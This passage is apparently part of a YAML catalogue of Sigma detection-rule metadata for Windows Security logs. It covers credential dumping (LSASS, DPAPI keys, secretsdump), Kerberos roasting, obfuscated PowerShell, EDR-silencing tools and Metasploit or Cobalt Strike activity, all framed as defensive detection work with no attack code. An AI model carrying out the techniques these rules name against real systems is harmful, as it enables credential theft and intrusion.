  - https://social.msdn.microsoft.com/Forums/vstudio/en-US/0878832e-39d7-4eaf-8e16-a729c4c40975/what-can-i-use-e13c0d23ccbc4e12931bd9cc2eee27e4-for?forum=clr
  - https://github.com/dotnet/runtime/blob/ee2355c801d892f2894b0f7b14a20e6cc50e0e54/docs/design/coreclr/jit/viewing-jit-dumps.md#setting-configuration-variables
  - https://github.com/dotnet/runtime/blob/f62e93416a1799aecc6b0947adad55a0d9870732/src/coreclr/src/inc/clrconfigvalues.h#L35-L38
  - https://github.com/dotnet/runtime/blob/7abe42dc1123722ed385218268bb9fe04556e3d3/src/coreclr/src/inc/clrconfig.h#L33-L39
  - https://github.com/dotnet/runtime/search?p=1&q=COMPlus_&unscoped_q=COMPlus_
  - https://bunnyinside.com/?term=f71e8cb9c76a
  - http://managed670.rssing.com/chan-5590147/all_p1.html
  - https://github.com/dotnet/runtime/blob/4f9ae42d861fcb4be2fcd5d3d55d5f227d30e723/docs/coding-guidelines/clr-jit-coding-conventions.md#1412-disabling-code
  - https://i.blackhat.com/EU-21/Wednesday/EU-21-Teodorescu-Veni-No-Vidi-No-Vici-Attacks-On-ETW-Blind-EDRs.pdf
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4ac1f50b-3bd0-4968-902d-868b4647937e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_dpapi_domain_backupkey_extraction.yml
  name: DPAPI Domain Backup Key Extraction
  description: Detects tools extracting LSA secret DPAPI domain backup key from Domain
    Controllers
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1003.004
  tags:
  - attack.credential-access
  - attack.t1003.004
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/190620-DomainDPAPIBackupKeyExtraction/notebook.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 39a94fd1-8c9a-4ff6-bf22-c058762f8014
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_dpapi_domain_masterkey_backup_attempt.yml
  name: DPAPI Domain Master Key Backup Attempt
  description: Detects anyone attempting a backup for the DPAPI Master Key. This events
    gets generated at the source and not the Domain Controller.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1003.004
  tags:
  - attack.credential-access
  - attack.t1003.004
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/190620-DomainDPAPIBackupKeyExtraction/notebook.html
  false_positives:
  - If a computer is a member of a domain, DPAPI has a backup mechanism to allow unprotection
    of the data. Which will trigger this event.
  notes: ''
- detection_id: f69a87ea-955e-4fb4-adb2-bb9fd6685632
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_external_device.yml
  name: External Disk Drive Or USB Storage Device Was Recognized By The System
  description: Detects external disk drives or plugged-in USB devices.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1091
  - T1200
  tags:
  - attack.t1091
  - attack.t1200
  - attack.lateral-movement
  - attack.initial-access
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-6416
  false_positives:
  - Likely
  notes: ''
- detection_id: a8f29a7b-b137-4446-80a0-b804272f3da2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_gpo_scheduledtasks.yml
  name: Persistence and Execution at Scale via GPO Scheduled Task
  description: Detect lateral movement using GPO scheduled task, usually used to deploy
    ransomware at scale
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.lateral-movement
  - attack.t1053.005
  time_window: ''
  references:
  - https://twitter.com/menasec1/status/1106899890377052160
  - https://www.secureworks.com/blog/ransomware-as-a-distraction
  - https://www.elastic.co/guide/en/security/7.17/prebuilt-rule-0-16-1-scheduled-task-execution-at-scale-via-gpo.html
  false_positives:
  - If the source IP is not localhost then it's super suspicious, better to monitor
    both local and remote changes to GPO scheduled tasks.
  notes: ''
- detection_id: 7b449a5e-1db5-4dd0-a2dc-4e3a67282538
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_hidden_user_creation.yml
  name: Hidden Local User Creation
  description: Detects the creation of a local hidden user account which should not
    happen for event ID 4720.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1136.001
  tags:
  - attack.persistence
  - attack.t1136.001
  time_window: ''
  references:
  - https://twitter.com/SBousseaden/status/1387743867663958021
  false_positives:
  - Unknown
  notes: ''
- detection_id: 98054878-5eab-434c-85d4-72d4e5a3361b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_hktl_edr_silencer.yml
  name: HackTool - EDRSilencer Execution - Filter Added
  description: 'Detects execution of EDRSilencer, a tool that abuses the Windows Filtering
    Platform (WFP) to block the outbound traffic of running EDR agents based on specific
    hardcoded filter names.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562
  tags:
  - attack.defense-evasion
  - attack.t1562
  time_window: ''
  references:
  - https://github.com/netero1010/EDRSilencer
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7b14c76a-c602-4ae6-9717-eff868153fc0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_hktl_nofilter.yml
  name: HackTool - NoFilter Execution
  description: 'Detects execution of NoFilter, a tool for abusing the Windows Filtering
    Platform for privilege escalation via hardcoded policy name indicators

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1134
  - T1134.001
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1134
  - attack.t1134.001
  time_window: ''
  references:
  - https://github.com/deepinstinct/NoFilter/blob/121d215ab130c5e8e3ad45a7e7fcd56f4de97b4d/NoFilter/Consts.cpp
  - https://github.com/deepinstinct/NoFilter
  - https://www.deepinstinct.com/blog/nofilter-abusing-windows-filtering-platform-for-privilege-escalation
  - https://x.com/_st0pp3r_/status/1742203752361128162?s=20
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0ee4d8a5-4e67-4faf-acfa-62a78457d1f2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_hybridconnectionmgr_svc_installation.yml
  name: HybridConnectionManager Service Installation
  description: Rule to detect the Hybrid Connection Manager service installation.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1554
  tags:
  - attack.persistence
  - attack.t1554
  time_window: ''
  references:
  - https://twitter.com/Cyb3rWard0g/status/1381642789369286662
  false_positives:
  - Legitimate use of Hybrid Connection Manager via Azure function apps.
  notes: ''
- detection_id: 32d56ea1-417f-44ff-822b-882873f5f43b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_impacket_psexec.yml
  name: Impacket PsExec Execution
  description: Detects execution of Impacket's psexec.py.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1021.002
  tags:
  - attack.lateral-movement
  - attack.t1021.002
  time_window: ''
  references:
  - https://web.archive.org/web/20230329171218/https://blog.menasec.net/2019/02/threat-hunting-3-detecting-psexec.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 252902e3-5830-4cf6-bf21-c22083dfd5cf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_impacket_secretdump.yml
  name: Possible Impacket SecretDump Remote Activity
  description: Detect AD credential dumping using impacket secretdump HKTL
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1003.002
  - T1003.003
  - T1003.004
  tags:
  - attack.credential-access
  - attack.t1003.002
  - attack.t1003.004
  - attack.t1003.003
  time_window: ''
  references:
  - https://web.archive.org/web/20230329153811/https://blog.menasec.net/2019/02/threat-huting-10-impacketsecretdump.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4edf51e1-cb83-4e1a-bc39-800e396068e3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_invoke_obfuscation_clip_services_security.yml
  name: Invoke-Obfuscation CLIP+ Launcher - Security
  description: Detects Obfuscated use of Clip.exe to execute PowerShell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: fd0f5778-d3cb-4c9a-9695-66759d04702a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_invoke_obfuscation_obfuscated_iex_services_security.yml
  name: Invoke-Obfuscation Obfuscated IEX Invocation - Security
  description: Detects all variations of obfuscated powershell IEX invocation code
    generated by Invoke-Obfuscation framework from the code block linked in the references
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1027
  tags:
  - attack.defense-evasion
  - attack.t1027
  time_window: ''
  references:
  - https://github.com/danielbohannon/Invoke-Obfuscation/blob/f20e7f843edd0a3a7716736e9eddfa423395dd26/Out-ObfuscatedStringCommand.ps1#L873-L888
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0c718a5e-4284-4fb9-b4d9-b9a50b3a1974
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_invoke_obfuscation_stdin_services_security.yml
  name: Invoke-Obfuscation STDIN+ Launcher - Security
  description: Detects Obfuscated use of stdin to execute PowerShell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: dcf2db1f-f091-425b-a821-c05875b8925a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_invoke_obfuscation_var_services_security.yml
  name: Invoke-Obfuscation VAR+ Launcher - Security
  description: Detects Obfuscated use of Environment Variables to execute PowerShell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7a922f1b-2635-4d6c-91ef-af228b198ad3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_invoke_obfuscation_via_compress_services_security.yml
  name: Invoke-Obfuscation COMPRESS OBFUSCATION - Security
  description: Detects Obfuscated Powershell via COMPRESS OBFUSCATION
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: f241cf1b-3a6b-4e1a-b4f9-133c00dd95ca
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_invoke_obfuscation_via_rundll_services_security.yml
  name: Invoke-Obfuscation RUNDLL LAUNCHER - Security
  description: Detects Obfuscated Powershell via RUNDLL LAUNCHER
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 80b708f3-d034-40e4-a6c8-d23b7a7db3d1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_invoke_obfuscation_via_stdin_services_security.yml
  name: Invoke-Obfuscation Via Stdin - Security
  description: Detects Obfuscated Powershell via Stdin in Scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1a0a2ff1-611b-4dac-8216-8a7b47c618a6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_invoke_obfuscation_via_use_clip_services_security.yml
  name: Invoke-Obfuscation Via Use Clip - Security
  description: Detects Obfuscated Powershell via use Clip.exe in Scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9b8d9203-4e0f-4cd9-bb06-4cc4ea6d0e9a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_invoke_obfuscation_via_use_mshta_services_security.yml
  name: Invoke-Obfuscation Via Use MSHTA - Security
  description: Detects Obfuscated Powershell via use MSHTA in Scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: cd0f7229-d16f-42de-8fe3-fba365fbcb3a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_invoke_obfuscation_via_use_rundll32_services_security.yml
  name: Invoke-Obfuscation Via Use Rundll32 - Security
  description: Detects Obfuscated Powershell via use Rundll32 in Scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4c54ba8f-73d2-4d40-8890-d9cf1dca3d30
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_invoke_obfuscation_via_var_services_security.yml
  name: Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION - Security
  description: Detects Obfuscated Powershell via VAR++ LAUNCHER
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0248a7bc-8a9a-4cd8-a57e-3ae8e073a073
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_iso_mount.yml
  name: ISO Image Mounted
  description: Detects the mount of an ISO image on an endpoint
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1566.001
  tags:
  - attack.initial-access
  - attack.t1566.001
  time_window: ''
  references:
  - https://www.trendmicro.com/vinfo/hk-en/security/news/cybercrime-and-digital-threats/malicious-spam-campaign-uses-iso-image-files-to-deliver-lokibot-and-nanocore
  - https://www.proofpoint.com/us/blog/threat-insight/threat-actor-profile-ta2719-uses-colorful-lures-deliver-rats-local-languages
  - https://twitter.com/MsftSecIntel/status/1257324139515269121
  - https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1553.005/T1553.005.md#atomic-test-1---mount-iso-image
  false_positives:
  - Software installation ISO files
  notes: ''
- detection_id: d04ae2b8-ad54-4de0-bd87-4bc1da66aa59
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_kerberoasting_activity.yml
  name: Kerberoasting Activity - Initial Query
  description: 'This rule will collect the data needed to start looking into possible
    kerberoasting activity.

    Further analysis or computation within the query is needed focusing on requests
    from one specific host/IP towards multiple service names within a time period
    of 5 seconds.

    You can then set a threshold for the number of requests and time between the requests
    to turn this into an alert.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1558.003
  tags:
  - attack.credential-access
  - attack.t1558.003
  time_window: ''
  references:
  - https://www.trustedsec.com/blog/art_of_kerberoast/
  - https://adsecurity.org/?p=3513
  false_positives:
  - Legacy applications.
  notes: ''
- detection_id: 3e2f1b2c-4d5e-11ee-be56-0242ac120002
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_kerberos_asrep_roasting.yml
  name: Potential AS-REP Roasting via Kerberos TGT Requests
  description: 'Detects suspicious Kerberos TGT requests with pre-authentication disabled
    (Pre-Authentication Type = 0) and Ticket Encryption Type (0x17) i.e, RC4-HMAC.

    This may indicate an AS-REP Roasting attack, where attackers request AS-REP messages
    for accounts without pre-authentication and attempt to crack the encrypted ticket
    offline to recover user passwords.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags: []
  time_window: ''
  references:
  - https://medium.com/system-weakness/detecting-as-rep-roasting-attacks-b5b3965f9714
  - https://www.picussecurity.com/resource/blog/as-rep-roasting-attack-explained-mitre-attack-t1558.004
  false_positives:
  - Legacy systems or applications that legitimately use RC4 encryption
  - Misconfigured accounts with pre-authentication disabled
  notes: ''
- detection_id: b07e58cf-cacc-4135-8473-ccb2eba63dd2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_kerberos_coercion_via_dns_object.yml
  name: Potential Kerberos Coercion by Spoofing SPNs via DNS Manipulation
  description: 'Detects modifications to DNS records in Active Directory where the
    Distinguished Name (DN) contains a base64-encoded blob

    matching the pattern "1UWhRCAAAAA...BAAAA". This pattern corresponds to a marshaled
    CREDENTIAL_TARGET_INFORMATION structure,

    commonly used in Kerberos coercion attacks. Adversaries may exploit this to coerce
    victim systems into authenticating to

    attacker-controlled hosts by spoofing SPNs via DNS. It is one of the strong indicators
    of a Kerberos coercion attack,.

    where adversaries manipulate DNS records to spoof Service Principal Names (SPNs)
    and redirect authentication requests like CVE-2025-33073.

    Please investigate the user account that made the changes, as it is likely a low-privileged
    account that has been compromised.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Collection
  - Persistence
  techniques:
  - T1557.003
  tags:
  - attack.collection
  - attack.credential-access
  - attack.t1557.003
  - attack.persistence
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html
  - https://www.synacktiv.com/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025
  false_positives:
  - Unknown
  notes: ''
- detection_id: 52d8b0c6-53d6-439a-9e41-52ad442ad9ad
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_lm_namedpipe.yml
  name: First Time Seen Remote Named Pipe
  description: This detection excludes known namped pipes accessible remotely and
    notify on newly observed ones, may help to detect lateral movement and remote
    exec using named pipes
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1021.002
  tags:
  - attack.lateral-movement
  - attack.t1021.002
  time_window: ''
  references:
  - https://twitter.com/menasec1/status/1104489274387451904
  false_positives:
  - Update the excluded named pipe to filter out any newly observed legit named pipe
  notes: ''
- detection_id: 962fe167-e48d-4fd6-9974-11e5b9a5d6d1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_lsass_access_non_system_account.yml
  name: LSASS Access From Non System Account
  description: Detects potential mimikatz-like tools accessing LSASS from non system
    account
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/170105-LSASSMemoryReadAccess/notebook.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: f0d1feba-4344-4ca9-8121-a6c97bd6df52
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_mal_creddumper.yml
  name: Credential Dumping Tools Service Execution - Security
  description: Detects well-known credential dumping tools execution via service execution
    events
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1003.001
  - T1003.002
  - T1003.004
  - T1003.005
  - T1003.006
  - T1569.002
  tags:
  - attack.credential-access
  - attack.execution
  - attack.t1003.001
  - attack.t1003.002
  - attack.t1003.004
  - attack.t1003.005
  - attack.t1003.006
  - attack.t1569.002
  - attack.s0005
  time_window: ''
  references:
  - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment
  false_positives:
  - Legitimate Administrator using credential dumping tool for password recovery
  notes: ''
- detection_id: 1de68c67-af5c-4097-9c85-fe5578e09e67
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_mal_wceaux_dll.yml
  name: WCE wceaux.dll Access
  description: Detects wceaux.dll access while WCE pass-the-hash remote command execution
    on source host
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: critical
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1003
  tags:
  - attack.credential-access
  - attack.t1003
  - attack.s0005
  time_window: ''
  references:
  - https://www.jpcert.or.jp/english/pub/sr/ir_research.html
  - https://jpcertcc.github.io/ToolAnalysisResultSheet
  false_positives:
  - Unknown
  notes: ''
- detection_id: 72124974-a68b-4366-b990-d30e0b2a190d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_metasploit_authentication.yml
  name: Metasploit SMB Authentication
  description: Alerts on Metasploit host's authentications on the domain.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1021.002
  tags:
  - attack.lateral-movement
  - attack.t1021.002
  time_window: ''
  references:
  - https://github.com/rapid7/metasploit-framework/blob/1416b5776d963f21b7b5b45d19f3e961201e0aed/lib/rex/proto/smb/client.rb
  false_positives:
  - Linux hostnames composed of 16 characters.
  notes: ''
- detection_id: 6fb63b40-e02a-403e-9ffd-3bcc1d749442
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_metasploit_or_impacket_smb_psexec_service_install.yml
  name: Metasploit Or Impacket Service Installation Via SMB PsExec
  description: Detects usage of Metasploit SMB PsExec (exploit/windows/smb/psexec)
    and Impacket psexec.py by triggering on specific service installation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1021.002
  - T1569.002
  - T1570
  tags:
  - attack.lateral-movement
  - attack.t1021.002
  - attack.t1570
  - attack.execution
  - attack.t1569.002
  time_window: ''
  references:
  - https://bczyz1.github.io/2021/01/30/psexec.html
  false_positives:
  - Possible, different agents with a 8 character binary and a 4, 8 or 16 character
    service name
  notes: ''
- detection_id: ecbc5e16-58e0-4521-9c60-eb9a7ea4ad34
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_meterpreter_or_cobaltstrike_getsystem_service_install.yml
  name: Meterpreter or Cobalt Strike Getsystem Service Installation - Security
  description: Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting
    a specific service installation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1134.001
  - T1134.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1134.001
  - attack.t1134.002
  time_window: ''
  references:
